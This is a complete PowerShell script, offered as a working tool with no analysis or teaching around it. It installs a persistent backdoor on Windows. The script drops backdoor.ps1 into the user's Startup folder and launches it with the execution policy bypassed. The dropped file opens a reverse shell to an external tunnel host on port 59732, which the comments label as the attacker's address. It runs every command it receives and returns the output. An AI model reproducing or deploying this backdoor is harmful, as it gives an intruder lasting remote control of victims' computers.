$ip = "22.ip.gl.ply.gg"  # Replace with your attacker's IP
$port = "59732"  # Replace with your attacker's port
$backdoorPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.ps1"

# Create a persistent backdoor
$script = @"
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
        $stream = $client.GetStream()
        [byte[]]$buffer = 0..65535|%{0}
        while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
            $cmd = (New-Object Text.UTF8Encoding).GetString($buffer, 0, $i)
            $sendback = (iex $cmd 2>&1 | Out-String)
            $sendback2 = $sendback + "PS " + (pwd).Path + "> "
            $sendbyte = ([text.encoding]::UTF8).GetBytes($sendback2)
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
    } catch {
        Start-Sleep -Seconds 5
    }
}
"@

# Write the script to a file
$script | Out-File -Encoding UTF8 $backdoorPath

# Run the backdoor script
powershell -ExecutionPolicy Bypass -File $backdoorPath
